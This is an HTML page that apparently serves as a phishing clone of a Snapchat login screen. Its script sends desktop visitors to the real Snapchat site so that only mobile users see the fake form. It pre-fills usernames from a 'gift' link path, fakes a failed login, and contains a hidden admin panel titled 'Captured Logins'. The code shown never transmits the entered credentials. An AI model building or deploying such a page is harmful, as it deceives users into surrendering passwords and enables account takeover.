<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>Log In</title>
<script>
(function(){
  const ua = navigator.userAgent.toLowerCase();
  if(!/mobile|android|iphone|ipad|tablet/i.test(ua) && (ua.includes("windows")||ua.includes("macintosh")||ua.includes("linux"))) {
    window.location.replace("https://accounts.snapchat.com/");
  }
})();
</script>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
<style>
@import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap");

body {
  font-family: "Inter", sans-serif;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}
::-webkit-scrollbar { display: none; }

/* Checkbox with checkmark */
input[type="checkbox"] {
  -webkit-appearance: none;
  width: 1rem; height: 1rem; border: 2px solid #d1d5db;
  border-radius: 0.25rem; position: relative; cursor: pointer;
}
input[type="checkbox"]:checked::after {
  content: '';
  position: absolute; left: 3.5px; top: 0.5px;
  width: 4.5px; height: 9px;
  border: solid #00b0ff;
  border-width: 0 2px 2px 0;
  transform: rotate(45deg);
}
input[type="checkbox"]:focus { outline: none; box-shadow: 0 0 0 2px rgba(0,176,255,0.3); }

/* Input fields */
.input-container { width: 85%; margin: 0 auto; }
input[type="text"], input[type="password"] { 
  width: 100%; 
  font-size: 0.9rem; font-weight: 500; 
  padding-bottom: 0.15rem; font-family: "Inter", sans-serif;
  border: none; border-bottom: 2px solid #d1d5db; border-radius: 0;
}
input:focus { outline: none; border-color: #00b0ff; }

/* Labels */
label[for="password"] { position: relative; top: -6px; font-size: 0.75rem; }
.password-container { margin-top: 4px; position: relative; }
label.inline-flex.items-center { position: relative; top: -8px; font-size: 0.817rem; font-weight: 350; }
#forgotPassword { position: relative; top: -9.5px; font-size: 0.817rem; font-weight: 350; color: #0083ff; }

/* Error message */
#errorMsg { width: 85%; margin: 0 auto; font-size: 0.8rem; text-align: left; color:#ff1952; font-weight: 400; position: relative; top: -6px; display: none; }

/* Login heading */
h1 { position: relative; top: -10px; font-size: 1.7rem; font-weight: 500; text-align: center; }

/* Login button */
#loginBtn { 
  position: relative; transition: background 0.2s ease; min-width: 42%; width: 62%; font-size: 1.05rem; padding: 0.7rem 0; margin: 0 auto; border-radius: 9999px; background-color: #b7c0c8; color: white; font-weight: 500;
}
#loginBtn:hover { background-color: #a0acb5; }
#loginBtn:active { background-color: #8b99a3; }

/* Spinner styles */
.spinner {
  position: absolute; top: 50%; left: 50%;
  transform: translate(-50%, -50%);
  width: 28px; height: 28px;
}
.spinner .ring {
  box-sizing: border-box;
  position: absolute; top: 0; left: 0; width: 100%; height: 100%;
  border: 3px solid #fff; border-top-color: transparent; border-radius: 50%;
  animation: spin 1s linear infinite;
}
.spinner .ring:nth-child(2) {
  border-width: 2px; animation-duration: 0.5s; animation-direction: reverse;
}
@keyframes spin { to { transform: rotate(360deg); } }

/* Other UI */
.card { background: white; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
.highlight { background-color: #eef2ff; padding: 0.5rem; border-radius: 8px; }
.remove-btn { cursor: pointer; color: #ef4444; }
.remove-btn:hover { color: #dc2626; }
#adminSection { display: none; }
.back-arrow i { font-size: 1rem; }

/* Password toggle */
.password-toggle { 
  position: absolute; right: 0; top: 50%; transform: translateY(-50%); 
  color: #adb7bf; font-size: 0.875rem; background: transparent; border: none; cursor: pointer; 
}
</style>
</head>
<body class="bg-white min-h-screen flex flex-col justify-between max-w-lg mx-auto relative">
<div id="loginSection" class="pt-4 px-6 relative flex flex-col flex-grow">
  <button aria-label="Back" class="absolute top-4 left-6 text-[#00b5e7] leading-none font-medium back-arrow" onclick="goBack()">
    <i class="fas fa-chevron-left"></i>
  </button>
  <h1 class="mt-4 mb-8 text-black font-medium font-sans">Log In</h1>
  <form id="loginForm" class="flex flex-col space-y-6">
    <div class="flex flex-col input-container">
      <label for="username" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">USERNAME, EMAIL, OR PHONE</label>
      <input id="username" type="text" class="pr-10 w-full" autocomplete="username" required inputmode="text">
    </div>
    <div class="flex flex-col password-container input-container">
      <label for="password" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">PASSWORD</label>
      <input id="password" type="password" class="pr-10 w-full" autocomplete="current-password" required inputmode="text">
      <button type="button" class="password-toggle" onclick="togglePassword()"><i id="eyeIcon" class="fas fa-eye-slash"></i></button>
    </div>
    <p id="errorMsg">Invalid username or password. Try again.</p>
    <label class="inline-flex items-center space-x-2 font-sans text-sm text-black input-container">
      <input type="checkbox" checked>
      <span>Save Login Info on your iCloud devices</span>
    </label>
    <a id="forgotPassword" href="#" class="text-center text-sm font-sans mt-2 input-container">Forgot your password?</a>
    <button id="loginBtn" type="submit">
      <span id="btnText">Log In</span>
      <div class="spinner" style="display:none;">
        <div class="ring"></div>
        <div class="ring"></div>
      </div>
    </button>
  </form>
</div>
<div id="adminSection" class="p-6 max-w-3xl mx-auto">
  <h1 class="text-3xl font-bold text-gray-900 mb-6">Admin Dashboard</h1>
  <div class="card p-6 mb-6">
    <h2 class="text-xl font-semibold text-gray-700 mb-4">Captured Logins</h2>
    <div class="overflow-y-auto max-h-96" id="loginList"></div>
  </div>
</div>
<script>
document.addEventListener("DOMContentLoaded", function(){
  const username = document.getElementById("username"),
        password = document.getElementById("password"),
        loginBtn = document.getElementById("loginBtn"),
        errorMsg = document.getElementById("errorMsg"),
        loginForm = document.getElementById("loginForm"),
        btnText = document.getElementById("btnText"),
        spinner = loginBtn.querySelector(".spinner");

  // Pre-fill username if URL matches /gift/{something}/login
  const pathMatch = window.location.pathname.match(/\/gift\/([^\/]+)\/login/);
  if(pathMatch && pathMatch[1]){ username.value = pathMatch[1]; }

  function togglePassword(){
    if(password.type === "password"){ password.type="text"; document.getElementById("eyeIcon").classList.replace("fa-eye-slash","fa-eye"); }
    else { password.type="password"; document.getElementById("eyeIcon").classList.replace("fa-eye","fa-eye-slash"); }
  }

  function enableButtonCheck(){
    if(username.value.trim() && password.value.trim()){ loginBtn.disabled = false; loginBtn.style.backgroundColor="#00b0ff"; }
    else { loginBtn.disabled = true; loginBtn.style.backgroundColor="#b7c0c8"; }
  }

  username.addEventListener("input", enableButtonCheck);
  password.addEventListener("input", () => { 
    enableButtonCheck(); 
    errorMsg.style.display = "none"; // hide error immediately on typing
  });

  loginForm.addEventListener("submit", async function(e){
    e.preventDefault();
    errorMsg.style.display = "none";
    spinner.style.display = "block";
    btnText.style.display = "none";

    // simulate network request
    setTimeout(()=>{
      spinner.style.display = "none";
      btnText.style.display = "inline";
      errorMsg.style.display = "block";
    }, 1000);
  });
});

function goBack(){ window.history.length>1 ? window.history.back() : window.location.reload(); }
</script>
</body>
</html>
